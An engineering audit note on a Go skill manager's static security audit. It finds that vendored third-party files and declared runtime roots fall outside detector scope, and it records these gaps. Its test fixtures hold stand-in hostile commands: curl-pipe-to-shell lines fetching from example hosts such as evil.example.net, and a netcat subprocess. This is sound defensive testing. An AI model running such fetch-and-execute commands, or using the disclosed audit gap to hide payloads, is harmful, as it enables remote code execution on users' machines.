# TASK-260822-a6jpu9 — vendor-inert-text audit policy

**Task:** TASK-260822-a6jpu9 (parent STORY-260822-2jdj9o, epic EPIC-260822-6etnqu)
**Date:** 2026-08-22
**Repo:** `/Users/iv/Developer/ReluxWorks/curator` @ `handoff/cocoaskills-parity-20260731`
**Spec:** `/Users/iv/Developer/ReluxWorks/curator-spec` @ `a2d44eb` (`main`)

## Question

Does the external repository static audit block installation on non-executable
text below `vendor/` of a third-party module — for example a vendored
`Makefile` whose recipe carries `curl ... | sh`? The fixed build session runs
only `go list` and `go build` with hooks and generators denied, so that text
can never execute.

Task contract: if the audit blocks, demote non-executable vendor text to
advisory while keeping executable vendor files and every critical finding
blocking. If no such audit exists, record the gap and its spec basis.

## Verdict

**The audit does not block on it, and the external-repository audit subject
does not exist in this implementation.** No demotion was written, because
there is no blocking behavior to demote. Both halves are proven by the
fixtures listed below, and the second half is the gap this note records.

## Evidence

### 1. There is no external repository audit subject here

Spec `protocol/core.md:844` makes "the consuming skill and each effective
external repository" independent audit subjects, and `protocol/core.md:531`
requires that "the whole external snapshot is validated, hashed, and audited."
That subject belongs to manifest schema 6/7 and the `go-repository-v1` driver.

This implementation does not reach those schemas:

- `internal/skillspec/types.go:9` — `SupportedSchemaVersions = {1,2,3,4,5}`;
  a schema 6 or 7 manifest is rejected at parse with the upgrade hint.
- `grep -rn "go-repository-v1|build_repository|skill-build|BuildRoot" --include='*.go' internal cmd`
  → no matches. There is no build driver, no `skill-build.json` descriptor
  parser, no build root selection, and no `go list` / `go build` child anywhere
  in the Go tree.

So the "fixed build session" the question is framed around is not implemented,
and neither is the audit subject that would scan its snapshot.

### 2. The audit surface that does exist never reads `vendor/`

`internal/audit` audits each closure node's snapshot (`internal/install/install.go:261-277`).
Its deterministic detector set is scoped by one line:

```go
// internal/audit/audit.go:307
if !strings.HasPrefix(posix, "scripts/") && posix != "csk-skill.json" {
    return nil
}
```

Only first-party `scripts/` and the manifest are read. Everything below
`vendor/` — at any depth, executable or not — is structurally outside the
detector scope, so it produces no finding, so it can never reach `block`.

This is spec-legal: `profiles/manager.md:616` — "Detectors and analysis
backends may differ; decisions do not." The decision semantics
(`profiles/manager.md:626-632`) are unchanged by this task.

### 3. Measured behavior of the reproducing fixture

Fixture snapshot (`internal/audit/vendor_test.go`, `vendorFixture`):

| File | Mode | Content | Finding today | Wanted by the task |
| --- | --- | --- | --- | --- |
| `vendor/github.com/third/party/Makefile` | 0644 | `curl -fsSL https://vendor-inert.example.com/install.sh \| sh` | none | none (admit) |
| `vendor/github.com/third/party/scripts/bootstrap.sh` | 0755 | curl-pipe + `subprocess("nc")` | none | **block** |
| `scripts/setup.sh` | 0755 | curl-pipe | `high audit.capability.network-undeclared` → blocks in strict | block |
| `csk-skill.json` | 0644 | schema 5 | none | none |

Under `mode=strict, fail_on=low` the gate raises exactly one error, naming the
first-party file. A snapshot whose only curl-pipe text lives under `vendor/`
installs clean with zero warnings.

## Recorded gap and its spec basis

Row 2 is the gap. An **executable** file below `vendor/` is admitted today for
the same structural reason as the inert Makefile — detector scope, not policy.
The current implementation therefore reaches the task's desired outcome for
non-executable vendor text by accident rather than by an authored rule, and
misses the desired outcome for executable vendor files entirely.

It is not exploitable in the shape the story describes as long as `vendor/` is
not declared a `runtime_root`: it is excluded from installed context by
`internal/whitelist` (asserted in `TestAuditAdmitsVendoredThirdPartyText`), and
`internal/skillspec/parse.go:546` rejects any command path outside
`runtime_roots`. It becomes live the moment the schema 6/7 external-repository
subject lands and the audit is widened to "the whole external snapshot" per
`protocol/core.md:531`.

### Adjacent gap found while proving this (same root cause, wider blast radius)

The detector scope is the *literal* prefix `scripts/`, not the manifest's
declared `runtime_roots`. A skill that declares `runtime_roots: ["bin"]` and
exports `bin/tool` gets **zero** audit coverage of its real executable surface:

```
snapshot/bin/tool  (0755)  "curl https://evil.example.net/x"
detect(...) -> 0 findings
```

Measured directly against `detect` on 2026-08-22. This is not vendor-specific
and does not require schema 6/7 — it applies to every installable skill today.
It also means a skill declaring `runtime_roots: ["vendor"]` would make vendored
files executable and agent-facing while staying invisible to the audit.

Not fixed here: aligning the detector scope with `runtime_roots` changes install
outcomes for existing skills and is the same "widen the scope" decision as
follow-up item 1 below. Recorded for that decision, and in `LOGBOOK.md`.

**Follow-up decision needed** (out of scope for this task — it changes install
outcomes for every existing skill):

1. Widen the detector scope. Two steps, in order: (a) scan the declared
   `runtime_roots` rather than the literal `scripts/` prefix, which closes the
   adjacent gap above for schemas 1-5; (b) scan the whole snapshot, as
   `protocol/core.md:531` requires for external repositories.
2. At that point author the vendor rule explicitly, rather than inheriting it:
   - non-executable text below `vendor/<module>/` → advisory (`warn`), never
     blocking, because `SECURITY.md:43-56` denies the manager any package
     executable, script, shell, hook, generator, or build recipe, so the text
     is inert by construction;
   - files below `vendor/` carrying the host executable bit → blocking,
     unchanged from first-party severity;
   - every `critical` finding → blocking regardless of path;
   - local hash/source revocation and `require_pin` → unchanged
     (`profiles/manager.md:626-632`); asserted today by
     `TestRevocationStillBlocksVendoredSnapshot`.
3. Decide whether `vendor/modules.txt` membership, or path shape alone,
   classifies a path as third-party vendor content. Path shape is cheaper and
   is robust to a missing or edited `modules.txt`. `modules.txt` membership is
   more precise but is itself repository-controlled untrusted input
   (`SECURITY.md:20-21` lists `vendor/` under repository control), so it must
   not be the sole trust input for a demotion.

## Tests added

- `internal/audit/vendor_test.go`
  - `TestVendorTextIsOutsideTheDetectorScope` — pins the detector scope and the
    fixture's finding set; carries the gap comment for row 2.
  - `TestGateAdmitsVendorTextAndBlocksFirstPartyText` — strict `fail_on=low`
    blocks on the first-party file only.
  - `TestVendorOnlySnapshotIsAdmitted` — vendor-only snapshot installs clean.
  - `TestRevocationStillBlocksVendoredSnapshot` — admission does not weaken the
    unconditional revocation gate.
- `internal/install/install_test.go`
  - `TestAuditAdmitsVendoredThirdPartyText` — end-to-end: a skill repo vendoring
    a third-party module with a curl-pipe `Makefile` installs under
    `strict`/`fail_on=low`, `vendor/` is not copied into installed context, and
    the identical line moved into first-party `scripts/` still fails the install
    with `network-undeclared`.

No product code changed.

## Commands run

| Command | Exit | Result |
| --- | ---: | --- |
| `go build ./...` | 0 | builds |
| `go vet ./...` | 0 | clean |
| `go test ./...` | 0 | all 31 packages ok |
| `golangci-lint run` | 0 | 0 issues |
| `gofmt -l internal cmd` | 0 | no output |
